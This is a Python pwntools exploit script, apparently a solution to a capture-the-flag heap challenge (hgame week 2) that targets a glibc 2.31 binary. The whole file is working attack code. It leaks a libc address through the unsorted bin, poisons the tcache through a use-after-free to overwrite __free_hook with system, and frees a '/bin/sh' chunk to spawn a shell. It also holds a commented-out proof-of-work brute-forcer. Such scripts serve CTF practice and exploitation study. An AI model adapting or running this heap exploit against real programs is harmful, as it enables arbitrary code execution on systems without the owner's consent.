# -*- coding: UTF-8 -*-
from pwn import *
from pwnlib.util.iters import mbruteforce 

context.log_level = 'debug'
context.terminal = ["/bin/tmux","sp","-h"]
context(arch='amd64',os='linux')
#io = remote('week-2.hgame.lwsec.cn', 31688)
#libc = ELF('./libc-2.31.so')
io = process('./vuln')
libc = ELF('./libc-2.31.so')

l64 = lambda      :u64(io.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(io.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))

#charset = string.printable
## charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 
#hash_code = io.recvuntil('\n', drop=True).decode().strip() 
## lg('hash_code')
#log.success('hash_code={}'.format(hash_code)) 
#passstr = mbruteforce(lambda x: hashlib.sha256((x).encode()).hexdigest() == hash_code, charset, 4, method='fixed') 
#sla('pass:',passstr)

def add(idx,size):
	sla('>','1')
	sla('Index: ',str(idx))
	sla('Size: ',str(size))
def show(idx):
	sla('>','4')
	sla('Index: ',str(idx))
	
def edit(idx,content):
	sla('>','3')
	sla('Index: ',str(idx))
	sla('Content: ',content)
		
def delete(idx):
	sla('>','2')
	sla('Index: ',str(idx))

for i in range(7):
	add(i,0xd0)
add(7,0xd0)
add(8,0x20)
for i in range(7):
	delete(i)
delete(7)
show(7)
libcbase = l64() - 0x1ecbe0
lg('libcbase')
system = libcbase + libc.symbols['system']
freehook = libcbase + libc.symbols['__free_hook']
binsh = libcbase + libc.search('/bin/sh\x00').next()
lg('system')
lg('binsh')
lg('freehook')

edit(6,p64(freehook))
add(9,0xd0)
edit(9,'/bin/sh\x00')
add(10,0xd0)
#dbg()
pause()
edit(10,p64(system))
delete(9)
irt()


